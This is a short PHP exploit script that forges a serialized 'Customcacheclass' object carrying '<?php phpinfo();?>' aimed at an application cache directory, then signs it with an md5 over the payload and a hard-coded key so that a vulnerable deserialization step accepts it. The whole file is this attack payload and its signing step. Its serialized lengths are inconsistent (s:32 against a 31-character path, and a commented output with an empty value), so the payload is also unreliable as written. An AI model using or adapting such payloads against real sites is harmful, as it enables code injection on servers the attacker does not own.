<?php
/*class Customcacheclass{
	var $dir='application/libraries/cache_dir';
	var $value='<?php phpinfo();?>';
}
echo serialize(new Customcacheclass);*/
//output O:16:"Customcacheclass":2:{s:3:"dir";s:31:"application/libraries/cache_dir";s:5:"value";s:18:"";}
$b='O:16:"Customcacheclass":2:{s:3:"dir";s:32:"application/libraries/cache_dir";s:5:"value";s:18:"<?php phpinfo();?>";}';
$key='h4ck3rk3y';
echo md5($b.$key);
?>